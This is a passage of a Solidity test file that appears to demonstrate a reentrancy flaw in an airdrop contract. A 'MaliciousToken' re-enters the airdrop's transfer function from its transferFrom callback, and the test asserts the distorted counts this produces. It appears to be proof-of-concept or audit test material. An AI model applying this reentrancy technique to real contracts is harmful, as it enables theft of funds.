    AirDropContract public airDrop;
    bool private _shouldReenter;

    function setAirDropContract(address _airDrop) public {
        airDrop = AirDropContract(_airDrop);
    }

    function toggleReentrancy(bool status) public {
        _shouldReenter = status;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        if (_shouldReenter) {
            _shouldReenter = false; // Prevent infinite loop

            // Trigger reentrancy with a new airdrop
            address[] memory r_tos = new address[](1);
            r_tos[0] = address(0xCAFE);

            uint[] memory r_values = new uint[](1);
            r_values[0] = 1;

            // Reenter transfer function
            airDrop.transfer(address(this), r_tos, r_values);
        }
        return true;
    }
}

contract AirDropReentrancyTest is Test {
    AirDropContract public airDrop;
    MaliciousToken public token;

    address internal constant RECIPIENT1 = address(0xB0B1);
    address internal constant RECIPIENT2 = address(0xDEF);
    address internal constant RECIPIENT_REENTER = address(0xCAFE);

    function setUp() public {
        // Deploy contracts
        airDrop = new AirDropContract();
        token = new MaliciousToken();

        // Setup malicious token
        token.setAirDropContract(address(airDrop));
        token.toggleReentrancy(true);
    }

    function testReentrancyInTransfer() public {
        // Prepare the original airdrop data
        address[] memory tos = new address[](2);
        tos[0] = RECIPIENT1;
        tos[1] = RECIPIENT2;

        uint[] memory vs = new uint[](2);
        vs[0] = 10;
        vs[1] = 20;

        // Execute vulnerable function
        airDrop.transfer(address(token), tos, vs);

        // Verify state after reentrancy
        (uint count1, uint amt1) = airDrop.getUserStats(RECIPIENT1);
        (uint count2, uint amt2) = airDrop.getUserStats(RECIPIENT2);
        (uint countReenter, uint amtReenter) = airDrop.getUserStats(RECIPIENT_REENTER);

        // Verify individual recipient records
        assertEq(amt1, 10, "Incorrect token rec for recipient 1");
        assertEq(count1, 1, "Incorrect airdrop count for recipient 1");
        assertEq(amt2, 20, "Incorrect token rec for recipient 2");
        assertEq(count2, 1, "Incorrect airdrop count for recipient 2");
        assertEq(amtReenter, 1, "Incorrect token rec for reentrant tx");
        assertEq(countReenter, 1, "Incorrect airdrop count for reentrant tx");

        // Verify global tracking
        assertEq(
            airDrop.totalAirdrops(), 
            2, 
            "Incorrect total airdrop count after reentrancy"
        );
        assertEq(
            airDrop.totalTokensDistributed(), 
            31, 
            "Incorrect total tokens distributed after reentrancy"
        );
    }
}
